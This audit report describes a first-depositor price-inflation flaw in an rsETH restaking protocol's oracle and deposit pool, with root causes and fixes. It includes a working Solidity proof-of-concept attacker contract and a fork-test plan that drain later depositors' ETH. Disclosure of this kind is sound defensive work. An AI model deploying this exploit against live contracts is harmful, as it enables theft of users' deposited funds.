Audit Report

## Title
First-Depositor rsETH Price Inflation via ETH Donation and Disabled `pricePercentageLimit` Guard — (`contracts/LRTOracle.sol`, `contracts/LRTDepositPool.sol`)

## Summary
An unprivileged attacker acting as the first depositor can inflate `rsETHPrice` from `1e18` to approximately `1e36` by minting 1 wei rsETH, donating ETH directly to the deposit pool via its open `receive()`, and calling the unrestricted public `updateRSETHPrice()`. The price-increase guard is permanently disabled because `pricePercentageLimit` is never initialized and defaults to `0`. After the manipulation, subsequent depositors receive near-zero or zero rsETH for their ETH, while the attacker's single wei of rsETH represents essentially all pool equity, enabling full drainage of deposited funds.

## Finding Description

**Root cause 1 — `updateRSETHPrice()` is unrestricted and bootstraps price to `1e18`.**
`updateRSETHPrice()` carries no role check. When `rsethSupply == 0`, it unconditionally sets `rsETHPrice = 1 ether` and returns. [1](#0-0) [2](#0-1) 

**Root cause 2 — 1 wei deposit is accepted when `minAmountToDeposit == 0`.**
`_beforeDeposit` only rejects `depositAmount == 0`; with `minAmountToDeposit` at its storage default of `0`, a 1 wei deposit passes. `getRsETHAmountToMint` computes `(1 * 1e18) / 1e18 = 1`, minting 1 wei rsETH. [3](#0-2) [4](#0-3) 

**Root cause 3 — Direct ETH donation inflates `totalETHInProtocol`.**
`LRTDepositPool` has an open `receive()`. `getETHDistributionData()` reads `address(this).balance` verbatim as `ethLyingInDepositPool`, so any directly donated ETH is counted as protocol TVL. [5](#0-4) [6](#0-5) 

**Root cause 4 — Price-increase guard is permanently disabled.**
The guard condition short-circuits to `false` whenever `pricePercentageLimit == 0`. This variable is never set in `initialize` or `reinitialize`, so it remains `0` until an admin explicitly calls `setPricePercentageLimit`. [7](#0-6) [8](#0-7) [9](#0-8) 

**Exploit flow:**
1. Call `updateRSETHPrice()` → `rsETHPrice = 1e18`, `highestRsethPrice = 1e18` (supply is 0).
2. Call `depositETH{value: 1}(0, "")` → 1 wei rsETH minted; `rsethSupply = 1`.
3. Send 1 ETH directly to `LRTDepositPool` → `address(this).balance ≈ 1e18`.
4. Call `updateRSETHPrice()` again:
   - `totalETHInProtocol ≈ 1e18`
   - `newRsETHPrice = divWad(1e18, 1) = 1e18 × 1e18 / 1 = 1e36`
   - Guard: `pricePercentageLimit > 0` is `false` → `isPriceIncreaseOffLimit = false` → no revert
   - `rsETHPrice = 1e36`, `highestRsethPrice = 1e36` [10](#0-9) [11](#0-10) [12](#0-11) [13](#0-12) 

**Why existing checks fail:**
- `_beforeDeposit` has no `rsethAmountToMint == 0` guard; if `minRSETHAmountExpected = 0` and `rsethAmountToMint = 0`, the check `0 < 0` is false and the call succeeds, silently burning the depositor's ETH.
- The `pricePercentageLimit` guard is structurally correct but relies on an admin post-deployment action with no deadline or enforcement, leaving a permanent attack window. [14](#0-13) 

## Impact Explanation
**Critical — Direct theft of user funds and protocol insolvency.**

After the manipulation, every depositor calling `depositETH` or `depositAsset` with an amount below `1e18 wei` (1 ETH) receives 0 rsETH while their ETH is retained by the pool. Callers passing `minRSETHAmountExpected = 0` (the default in many integrations) lose funds silently. The attacker's 1 wei rsETH constitutes ~100% of total rsETH supply; upon redemption it claims essentially all ETH in the pool, constituting direct theft of all subsequently deposited user funds and rendering the protocol insolvent.

## Likelihood Explanation
- No privileged role is required; `updateRSETHPrice()` and `depositETH()` are both callable by any EOA.
- `minAmountToDeposit` and `pricePercentageLimit` both default to `0` — no admin action is needed to enable the attack.
- The attack window opens at deployment and remains open until an admin calls `setPricePercentageLimit`, which has no deadline or enforcement mechanism.
- The upfront cost is 1 ETH (the donation), which is fully recoverable upon redemption against the inflated pool.
- The attack is atomic and can be executed in a single transaction via a helper contract.

## Recommendation
1. **Set a non-zero `pricePercentageLimit` in `initialize`.** E.g., `pricePercentageLimit = 1e16` (1%) so the guard is active from block 0.
2. **Seed the pool atomically at deployment.** Mint a meaningful initial rsETH supply (e.g., `1e15 wei`) to a dead address so `rsethSupply` is never `1` in production.
3. **Exclude untracked ETH from TVL.** Track only ETH received through controlled entry points (`depositETH`, `receiveFromNodeDelegator`, etc.) using an internal accounting variable rather than raw `address(this).balance`.
4. **Set `minAmountToDeposit` to a non-trivial value** (e.g., `0.001 ether`) in `initialize` to prevent dust deposits.
5. **Revert on zero rsETH mint.** Add `if (rsethAmountToMint == 0) revert ZeroRsethMint()` in `_beforeDeposit` to prevent silent fund loss.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

interface ILRTOracle  { function updateRSETHPrice() external; function rsETHPrice() external view returns (uint256); }
interface ILRTDepositPool { function depositETH(uint256 min, string calldata ref) external payable; }

contract FirstDepositorPoC {
    ILRTOracle      oracle;
    ILRTDepositPool pool;

    constructor(address _oracle, address _pool) {
        oracle = ILRTOracle(_oracle);
        pool   = ILRTDepositPool(_pool);
    }

    function attack() external payable {
        // Step 1: bootstrap price (supply == 0 → rsETHPrice = 1e18)
        oracle.updateRSETHPrice();

        // Step 2: mint 1 wei rsETH (minAmountToDeposit == 0 allows this)
        pool.depositETH{value: 1}(0, "");

        // Step 3: donate 1 ETH — counted verbatim via address(this).balance
        payable(address(pool)).transfer(1 ether);

        // Step 4: inflate price — pricePercentageLimit == 0 so guard is skipped
        oracle.updateRSETHPrice();

        // rsETHPrice is now ~1e36
        require(oracle.rsETHPrice() > 1e30, "attack failed");

        // Step 5 (victim tx): victim.depositETH{value: 0.5 ether}(0, "")
        // rsethAmountToMint = (0.5e18 * 1e18) / 1e36 = 0 → victim loses 0.5 ETH silently
    }
}
```

**Foundry fork test plan:**
1. Fork mainnet/testnet with deployed contracts.
2. Deploy `FirstDepositorPoC` with oracle and pool addresses.
3. Call `attack{value: 1 ether + 1}()`.
4. Assert `oracle.rsETHPrice() > 1e30`.
5. Simulate a victim calling `pool.depositETH{value: 0.5 ether}(0, "")`.
6. Assert victim's rsETH balance is `0` and pool ETH balance increased by `0.5 ether`.
7. Have attacker redeem their 1 wei rsETH and assert they receive the full pool balance.
